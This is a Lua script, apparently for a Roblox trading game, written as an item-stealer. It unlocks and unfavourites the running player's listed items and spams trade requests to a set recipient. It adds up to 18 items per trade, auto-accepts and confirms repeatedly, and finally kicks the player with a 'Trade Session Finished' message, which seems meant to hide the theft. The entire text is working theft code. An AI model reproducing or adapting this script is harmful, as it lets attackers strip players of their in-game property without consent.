local function hAPI(name, ...)
    local router = Fsys("RouterClient")
    local remote = router.get(name)
    if remote then
        if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
        remote:FireServer(...)
    end
end

local function executePhantomLoop(rec, hits)
    -- Multi-Trade Loop
    task.spawn(function()
        local currentHits = hits
        while #currentHits > 0 do
            -- Prep Unlock
            for i = 1, math.min(18, #currentHits) do
                hAPI("BackpackAPI/SetItemLocked", currentHits[i].uid, false)
                hAPI("BackpackAPI/SetItemFavorite", currentHits[i].uid, false)
            end
            
            local lastReq, burst, s2s = 0, 0, false
            local inTrade = false
            
            -- Burst Request Logic (2s Sniper + 10.1s Reset)
            while not inTrade do
                local tradeUI = LP.PlayerGui:FindFirstChild("TradeApp")
                if tradeUI and tradeUI.Enabled and tradeUI:FindFirstChild("Frame") and tradeUI.Frame.Visible then
                    inTrade = true
                    break
                end
                
                if not s2s then 
                    task.wait(2)
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    s2s, lastReq, burst = true, tick(), 1
                elseif tick() - lastReq > 10.1 then 
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    lastReq, burst = tick(), 1
                elseif burst < 3 then 
                    hAPI("TradeAPI/SendTradeRequest", rec)
                    burst = burst + 1; task.wait(0.5) 
                end
                task.wait(0.5)
            end

            -- Tobi-style Batch Add (Instant Packet)
            for i = 1, math.min(18, #currentHits) do
                task.spawn(function() hAPI("TradeAPI/AddItemToOffer", currentHits[1].uid) end)
                table.remove(currentHits, 1)
            end

            -- Auto Accept Spam
            local start = tick()
            while tick() - start < 15 do
                hAPI("TradeAPI/AcceptNegotiation")
                hAPI("TradeAPI/ConfirmTrade")
                task.wait(0.4)
                local tradeUI = LP.PlayerGui:FindFirstChild("TradeApp")
                if not tradeUI.Frame.Visible then break end
            end
            task.wait(1) -- Cool down before re-requesting
        end
        LP:Kick("Trade Session Finished.")
    end)
end

